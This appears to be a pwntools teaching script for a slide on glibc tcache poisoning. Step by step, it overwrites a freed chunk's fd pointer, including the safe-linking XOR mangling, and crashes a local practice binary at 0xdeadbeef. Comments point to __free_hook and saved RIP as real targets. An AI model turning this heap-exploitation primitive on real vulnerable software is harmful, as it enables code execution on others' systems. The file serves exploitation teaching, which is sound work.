#!/usr/bin/env python3
"""
vis_demo.py — Live tcache fd-pointer poisoning demo.

Designed for slide 7 ("Tcache in One Picture").
Prints inline hex dumps at each step — no GDB needed.

Run:
  python3 vis_demo.py           ← Docker or native, inline hex dumps
  python3 vis_demo.py GDB       ← native only, opens GDB in second terminal

On glibc 2.31 (Docker heap-hooks): fd is PLAINTEXT — you see 0xdeadbeef raw.
On glibc 2.32+:                    fd is MANGLED  — raw bytes differ, allocator demangles.

Docker workflow:
  docker run --rm -it heap-hooks
  python3 vis_demo.py
  # Step through with Enter — STEP 3 is the money shot

Flow:
  STEP 1  — Allocate three chunks (A, B, C)
  STEP 2  — Free C then B → tcache chain: B → C
  STEP 3  — Edit B's fd to 0xdeadbeef (the poisoning primitive)
  STEP 4  — Alloc pops B, next alloc would return 0xdeadbeef → crash
"""
from pwn import *

context.binary = exe = ELF('./note', checksec=False)
context.log_level = 'info'

TARGET = 0xdeadbeef   # classic recognizable poison target

def start():
    if args.GDB:
        return gdb.debug(exe.path, gdbscript='continue\n')
    else:
        return process(exe.path)

io = start()

def alloc(i, sz, data=b"\x00"):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"idx: ", str(i).encode())
    io.sendlineafter(b"size: ", str(sz).encode())
    io.sendafter(b"data: ", data)

def free(i):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"idx: ", str(i).encode())

def edit(i, data):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"idx: ", str(i).encode())
    io.sendafter(b"data: ", data)

def show(i, n):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"idx: ", str(i).encode())
    return io.recvn(n)

def hexline(raw, label=""):
    """Format 8 bytes as a hex dump line."""
    hex_str = " ".join(f"{b:02x}" for b in raw)
    val = u64(raw.ljust(8, b'\x00'))
    return f"  {hex_str}   →  {val:#018x}  {label}"

def dump_fd(idx, name, label=""):
    """Read and print a chunk's fd field as a hex dump."""
    raw = show(idx, 8)
    val = u64(raw)
    print(f"  ┌─ {name} fd bytes ─────────────────────────────────────┐")
    print(f"  │ {hexline(raw, label):55s} │")
    print(f"  └─────────────────────────────────────────────────────────┘")
    return raw, val

# ================================================================
#  STEP 1: Allocate three chunks of the same tcache size
# ================================================================
log.info("Allocating chunks A(0), B(1), C(2) — size 0x30 each")
alloc(0, 0x30, b"A" * 0x30)
alloc(1, 0x30, b"B" * 0x30)
alloc(2, 0x30, b"C" * 0x30)
alloc(3, 0x20, b"G" * 0x20)    # guard

print()
print("=" * 60)
print("[STEP 1] Three 0x30 chunks allocated: A, B, C")
print("  All in-use, filled with AAAA / BBBB / CCCC")
if args.GDB:
    print("  → In GDB: Ctrl+C → vis_heap_chunks → c")
print("=" * 60)
input("Press Enter to continue...")

# ================================================================
#  STEP 2: Free C then B → tcache chain: B → C → NULL
# ================================================================
log.info("Freeing C(2) then B(1) → tcache 0x40: B → C")
free(2)
free(1)

# Detect safe-linking
_, raw_c = dump_fd(2, "chunk C (tail)")
if raw_c == 0:
    safe_link = False
    log.info("No safe-linking (glibc < 2.32) — PLAINTEXT fd pointers")
else:
    safe_link = True
    heap_page = raw_c
    log.info(f"Safe-linking detected — heap page bits: {heap_page:#x}")

print()
_, raw_b = dump_fd(1, "chunk B (head)")

print()
print("=" * 60)
print("[STEP 2] B and C freed into tcache 0x40 bin")
print("  Chain: B → C → NULL")
if safe_link:
    print("  fd pointers are MANGLED (safe-linking, glibc 2.32+)")
else:
    print("  fd pointers are PLAINTEXT (no safe-linking)")
    print("  ^^^ this is why 2.31 is the classic target")
if args.GDB:
    print("  → In GDB: Ctrl+C → vis_heap_chunks → c")
print("=" * 60)
input("Press Enter to continue...")

# ================================================================
#  STEP 3: Overwrite B's fd with 0xdeadbeef — THE POISON
# ================================================================
log.info(f"Poisoning B's fd → {TARGET:#x}")

if safe_link:
    mangled_target = heap_page ^ TARGET
    edit(1, p64(mangled_target))
    log.success(f"Wrote mangled fd: {mangled_target:#x}")
    log.success(f"  allocator will deobfuscate → {TARGET:#x}")
else:
    edit(1, p64(TARGET))
    log.success(f"Wrote PLAINTEXT fd: {TARGET:#x}")

print()
raw_b_bytes, raw_b_val = dump_fd(1, "chunk B (POISONED)")

print()
print("=" * 60)
print(f"[STEP 3] *** POISONED! *** B's fd now resolves to {TARGET:#x}")
if not safe_link:
    print(f"  Look at the raw bytes: deadbeef is RIGHT THERE in memory")
    print(f"  No obfuscation. No mangling. Just a raw pointer overwrite.")
else:
    print(f"  Raw bytes show {raw_b_val:#x} (mangled)")
    print(f"  Allocator demangles: {heap_page:#x} ^ {raw_b_val:#x} = {TARGET:#x}")
print()
print(f"  tcache 0x40 chain:  B → {TARGET:#x}  (was: B → C)")
if args.GDB:
    print("  → In GDB: Ctrl+C → vis_heap_chunks → c")
print("  THIS IS THE ENTIRE TCACHE POISONING PRIMITIVE")
print("=" * 60)
input("Press Enter to trigger the crash...")

# ================================================================
#  STEP 4: Pop B, then the next alloc returns 0xdeadbeef → crash
# ================================================================
log.info("Popping B from tcache — next-in-line is now 0xdeadbeef")
alloc(4, 0x30)

log.warning(f"Next malloc(0x30) will return {TARGET:#x} — invalid memory!")
try:
    alloc(5, 0x30)
    log.failure("Unexpected: no crash")
except EOFError:
    print()
    print("=" * 60)
    print(f"[STEP 4] CRASH! malloc tried to return {TARGET:#x}")
    if safe_link:
        print("  aligned_OK caught the unaligned pointer → SIGABRT")
        print("  (0xdeadbeef & 0xf = 0xf — not 16-byte aligned)")
    else:
        print("  The process died trying to use invalid memory")
    print()
    print("  The primitive: overwrite one fd pointer, control where")
    print("  the next allocation lands. Point it at __free_hook,")
    print("  environ, saved RIP — same write, different target.")
    print("=" * 60)
